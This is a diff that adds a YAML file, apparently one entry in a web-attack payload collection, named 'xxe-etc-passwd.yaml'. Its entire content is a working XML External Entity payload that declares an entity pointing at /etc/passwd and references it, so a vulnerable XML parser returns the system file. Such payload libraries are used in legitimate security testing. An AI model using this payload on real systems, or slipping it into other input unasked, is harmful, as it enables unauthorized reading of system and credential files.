@@ -1,0 +1,10 @@
+metadata:
+  filename: "xxe-etc-passwd.yaml"
+  tags: ["web"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+  <bar>&ent;</bar>
